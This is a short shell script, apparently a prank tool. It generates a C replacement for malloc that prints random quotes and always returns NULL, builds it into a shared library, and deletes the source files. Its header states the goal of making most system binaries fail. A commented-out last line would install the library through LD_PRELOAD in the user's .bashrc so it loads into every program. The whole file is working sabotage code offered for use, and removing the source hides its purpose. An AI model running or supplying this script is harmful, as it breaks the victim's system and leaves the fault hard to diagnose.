#!/bin/sh
#
# Simple script who replace the system malloc by a fake
# this causes the failure of most system binary
#
echo '#include <stdlib.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <time.h>
void *malloc(size_t z) { static long long i = 0; srand(time(NULL));
i = (z + i + rand() + 42) % 10; switch (i) { case 0: write(1, "Flying cats are the best!!!\n", 28);
break; case 1: write(1, "My haters are my motivaters...\n", 31); break; case 2:
write(1, "If you can make me smile, Ill remember you ;)\n", 47); break; case 3:
write(1, "Dont call it a dream. Call it a plan!\n", 39); break; case 4:
write(1, "Your opinion of me doesnt define who I am\n", 43); break; case 5:
write(1, "Be brave. Take risks. Nothing can subtitude experience!!!\n", 58);
break; case 6: write(1, "Look like a girl. Act like a lady. Think like a man. Work like a boss.\n", 71);
break; case 7: write(1, "to test is to doubt.\n", 21); break; case 8:
write(1, "Big or small, lies are lies!\n", 29); break; case 9:
write(1, "I challenge life :)\n", 20); break; } return (NULL); }' > foo.c
# After the source file created, compile the shared object
gcc -Wall -Wextra -c foo.c -fpic
gcc -shared -o libfoo.so foo.o
# Remove all source / object files
rm foo.c foo.o
# set LD_PRELOAD environment variable to libfoo's path
#echo export LD_PRELOAD=$PWD/libfoo.so >> $HOME/.bashrc
#. ./install.sh
